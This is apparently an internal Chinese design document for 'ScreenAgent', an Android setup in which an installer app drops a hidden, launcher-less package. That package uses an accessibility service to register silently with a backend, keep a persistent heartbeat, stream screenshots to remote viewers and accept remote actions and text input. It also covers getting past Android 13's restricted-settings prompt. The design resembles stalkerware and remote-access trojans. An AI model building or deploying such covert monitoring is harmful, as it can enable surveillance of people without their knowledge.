# ScreenAgent 自动上线、心跳与实时最新帧

日期：2026-09-28。当前版本为 B 包 `screenagent-1.5`。用户只需安装 B 包并在 Android 系统设置中启用其无障碍服务；不填写后台地址、登记码或设备 JWT。后台域名与 APK ID 在构建时写入 B 包，设备凭证由 Node 静默签发并保存在应用私有存储。

## 用户流程

1. 在构建中心先构建 `screenagent-1.5` B 包。构建服务写入后台 HTTPS 域名、账号固定 APK ID、构建 ID、包名和版本。
2. 构建 A 包。A 包携带该账号最新成功的 B 包、摘要和包名。
3. A 包首次打开且未检测到 B 包时只显示「安装 B 包」。用户在 Android 系统安装器确认。
4. 返回 A 包后显示无障碍引导。Android 13 及以上若侧载 B 包的无障碍项被系统置灰，用户先打开 B 包应用信息并在系统菜单选择「允许受限设置」，再点击「打开无障碍」；旧系统直接进入无障碍设置。
5. 用户启用 B 包无障碍服务。B 包自动上线、建立心跳并上传一张首图；B 包没有 Activity、MAIN/LAUNCHER 或首页。
6. 返回 A 包后进入配置的 HTTPS WebView。以后只要 B 包已安装，A 包直接进入 WebView。

## 自动归属

无障碍服务 `onServiceConnected()` 读取构建时写入的配置并调用：

```http
POST /api/client/online
X-Boundary-Request: 1
Content-Type: application/json
```

```json
{
  "deviceId": "由 Android ID 与 APK ID 派生的稳定标识",
  "apkId": "1",
  "brand": "Android 品牌",
  "model": "设备型号",
  "osVersion": "11",
  "appVersion": "1.4.0",
  "appName": "构建应用名",
  "batch": "可选批次",
  "buildId": "构建 UUID",
  "packageName": "实际 B 包包名"
}
```

Node 在事务中查询已启用的 `apk_routes.apk_id`，取得 `project_id` 和 `owner_account_id`，再按 `deviceId` 幂等创建或更新设备。既有设备的项目、APK ID 或账号不匹配时返回 409；拉黑、软删除或撤销凭证的设备返回 403。成功时自动签发 30 天内部设备 Token：

```json
{
  "deviceId": "...",
  "localId": 12,
  "apkId": "1",
  "owner": { "id": 1, "username": "mtx" },
  "deviceToken": "内部 JWT",
  "expiresAt": 1790611200000,
  "heartbeatSeconds": 20
}
```

用户界面不显示或要求输入该 Token。Token 到期或 WS 返回 401/403 时，B 包清除本地旧 Token 并重新调用 `/api/client/online`。旧 `/api/device-enrollments` 与 `/api/client/register` 仅为旧版 B 包兼容，当前账号页面不展示登记入口。

## 心跳、断网与重启

- 自动上线成功后连接 `/ws/device`，先发 `register` 和 `status`，随后每 20 秒发送 `device_ping`。
- Node 在 90 秒内未收到状态时将设备标记离线；WebSocket 关闭也立即发布离线状态。
- 重连退避为 1、2、4、8、16、30 秒，上限 30 秒。
- B 包使用 `ConnectivityManager.registerDefaultNetworkCallback`。飞行模式关闭、Wi-Fi/移动网络重新可用时，如果 WS 已断开会立即重连，不等待原退避计时器。
- Android 重启后会保留用户已启用的无障碍设置。系统重新绑定服务并调用 `onServiceConnected()` 时，B 包重复自动上线流程；不弹 Activity。
- 进程被系统回收后逻辑相同：服务重新创建时先复用有效 Token，Token 无效则静默续签。

## 首图与实时查看

WS 首次进入在线状态且 Android 版本为 11 及以上时，B 包申请 `initial_accessibility` 上传许可，调用 `AccessibilityService.takeScreenshot()`，压缩为 JPEG 并上传一次。Node 校验无障碍在线状态，同设备一分钟内最多接受一次首图，图片只在有界内存保存 5 分钟。

网页打开设备详情并点击「开始」后：

1. 面板每 5 秒发送查看心跳，Node 签发 12 秒查看租约。
2. Node 下发 `SCREENSHOT_VIEWER_LEASE` 和 `SCREENSHOT_NOW`。
3. B 包只在租约有效时串行执行“申请上传许可 → `takeScreenshot` → 缩放到最大 540px 宽 → JPEG 50 → 上传”。Android 11 间隔不短于 1001ms，Android 12+ 不短于 334ms；同一时刻最多处理一帧。
4. 浮窗同时开放返回、Home、多任务、锁屏、点亮和勿扰六个固定操作；Node 与 B 包都要求同一 `viewerId` 租约有效。不接受文本、坐标、手势或通用指令。
5. 页面关闭、面板 WS 断开或租约过期时，Node 下发 `SCREENSHOT_VIEWER_CLOSE`，B 包立即停止后续截图并拒绝快捷操作，但设备心跳继续。 同一租约内的 `TEXT_INPUT` 也随即失效；该指令只写入当前聚焦的非密码输入框，不回传节点内容。

截图 multipart 字段固定为 `deviceId/apkId/batch/buildId/ts/file`，请求头 `X-Capture-Upload` 绑定一次性上传许可。JPEG 最大 2MiB、最多 400 万像素、最长边 4096px；1.4 模板在手机端先以最大 540px 宽、质量 50 编码，Node 再解码、旋转、去除元数据并重新编码，新帧替换旧帧。

## 源码位置

- 自动上线与首图：`android/apk-templates/b-packages/screenagent-1.4/app/src/main/java/com/zaka/screenagent/accessibility/BoundaryAccessibilityService.kt`
- 网络恢复与 WS 心跳：`android/apk-templates/b-packages/screenagent-1.4/app/src/main/java/com/zaka/screenagent/net/AgentSocket.kt`
- HTTP 自动上线与上传：`android/apk-templates/b-packages/screenagent-1.4/app/src/main/java/com/zaka/screenagent/net/HttpUploader.kt`
- 设备私有 Token：`android/apk-templates/b-packages/screenagent-1.4/app/src/main/java/com/zaka/screenagent/net/DeviceSession.kt`
- Node 归属与上传：`backend/src/device-ingress.js`
- 查看租约与设备通道：`backend/src/websocket.js`

## 验证

代码交付需执行：

```bash
npm run check
npm run test:e2e
npm run build:screenagent
```

构建成功仅证明 Gradle、Lint、签名、对齐、包身份和无桌面入口检查通过。Android 系统安装返回、无障碍绑定、飞行模式恢复、进程回收和手机重启仍需在模拟器或登记测试设备分别验证。
